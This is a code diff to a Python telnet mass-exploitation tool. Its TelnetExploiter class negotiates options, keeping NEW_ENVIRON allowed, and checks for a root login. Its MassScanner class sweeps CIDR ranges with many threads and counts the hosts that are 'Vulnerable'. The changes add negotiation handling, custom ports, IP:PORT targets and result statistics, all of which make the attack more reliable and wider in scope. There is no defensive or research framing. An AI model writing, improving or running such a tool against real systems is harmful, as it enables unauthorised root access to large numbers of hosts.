@@ -8,6 +8,7 @@ import time
 import os
 from enum import Enum
 from typing import Tuple, Optional
+from collections import Counter
 
 # Third-party imports
 try:
@@ -138,7 +139,21 @@ class TelnetExploiter:
                                     
                                 i += 2 # Skip cmd+opt
                             else:
-                                pass # Wait for more data
+                                # Handle other commands (DO/DONT/WILL/WONT)
+                                if i + 2 < len(data):
+                                    cmd = data[i+1:i+2]
+                                    opt = data[i+2:i+3]
+                                    
+                                    # Default deny/reject policy to keep negotiation moving
+                                    if cmd == DO:
+                                        if opt != OPT_NEW_ENVIRON:
+                                            self.sock.sendall(IAC + WONT + opt)
+                                    elif cmd == WILL:
+                                        self.sock.sendall(IAC + DONT + opt)
+                                    
+                                    i += 2
+                                else:
+                                    i += 1 # Should not happen if data is complete, but safe fallback
                         i += 1
                         
                     # Check for successful root login
@@ -173,24 +188,39 @@ class TelnetExploiter:
 # SCANNER & REPORTING
 # ==============================================================================
 class MassScanner:
-    def __init__(self, targets, threads=10, timeout=5, output_file=None):
+    def __init__(self, targets, port=23, threads=10, timeout=5, output_file=None):
         self.targets = targets
+        self.port = port
         self.threads = threads
         self.timeout = timeout
         self.output_file = output_file
         self.lock = threading.Lock()
+        self.stats = Counter()
         
     def expand_targets(self):
-        """Yields single IPs from the target list (handles CIDRs and Strings)"""
+        """Yields (ip, port) tuples from the target list (handles CIDRs and Strings)"""
         for t in self.targets:
             t = t.strip()
             if not t: continue
+            
+            target_port = self.port
+            
+            # Check for IP:PORT format (simple check for IPv4)
+            if ':' in t and not t.startswith('['): # Basic check to allow IPv4:Port
+                parts = t.split(':')
+                if len(parts) == 2:
+                    try:
+                        target_port = int(parts[1])
+                        t = parts[0]
+                    except ValueError:
+                        pass # proceed with original t if parse fails
+
             try:
                 if "/" in t:
                     for ip in IPNetwork(t):
-                        yield str(ip)
+                        yield (str(ip), target_port)
                 else:
-                    yield t
+                    yield (t, target_port)
             except:
                 print(f"{Fore.RED}[!] Invalid target format: {t}{Style.RESET_ALL}")
 
@@ -204,17 +234,20 @@ class MassScanner:
             elif status == Status.ERROR:
                 print(f"{Fore.RED}[ERR ] {ip} : {message}{Style.RESET_ALL}")
             elif status == Status.CLOSED:
-                # print(f"{Fore.CYAN}[CLOS] {ip} : {message}{Style.RESET_ALL}")
+                print(f"{Fore.CYAN}[CLOS] {ip} : {message}{Style.RESET_ALL}")
                 pass
+            
+            self.stats[status] += 1
                 
             if self.output_file:
                 with open(self.output_file, "a") as f:
                     f.write(f"{ip},{status.value},{message}\n")
 
-    def scan_host(self, ip):
-        exploiter = TelnetExploiter(ip, timeout=self.timeout)
+    def scan_host(self, target_entry):
+        ip, port = target_entry
+        exploiter = TelnetExploiter(ip, port=port, timeout=self.timeout)
         status, msg = exploiter.run()
-        self.log_result(ip, status, msg)
+        self.log_result(f"{ip}:{port}", status, msg)
 
     def run(self):
         print(f"{Fore.BLUE}[*] Starting scan using {self.threads} threads...{Style.RESET_ALL}")
@@ -225,6 +258,10 @@ class MassScanner:
             executor.map(self.scan_host, target_gen)
             
         print(f"\n{Fore.BLUE}[*] Scan Complete.{Style.RESET_ALL}")
+        print(f"    Total Scanned: {sum(self.stats.values())}")
+        print(f"    Vulnerable:    {self.stats[Status.VULNERABLE]}")
+        print(f"    Safe:          {self.stats[Status.SAFE]}")
+        print(f"    Closed/Error:  {self.stats[Status.CLOSED] + self.stats[Status.ERROR]}")
 
 # ==============================================================================
 # CLI HANDLER
@@ -236,6 +273,7 @@ def parse_args():
     group.add_argument("-f", "--file", help="File containing list of IPs/CIDRs")
     
     parser.add_argument("-T", "--threads", type=int, default=10, help="Number of concurrent threads")
+    parser.add_argument("-p", "--port", type=int, default=23, help="Target port (default: 23)")
     parser.add_argument("--timeout", type=int, default=5, help="Socket timeout in seconds")
     parser.add_argument("-o", "--output", help="Output CSV file for results")
     
@@ -256,7 +294,8 @@ def main():
             targets = [line.strip() for line in f if line.strip()]
 
     scanner = MassScanner(
-        targets=targets, 
+        targets=targets,
+        port=args.port, 
         threads=args.threads, 
         timeout=args.timeout, 
         output_file=args.output
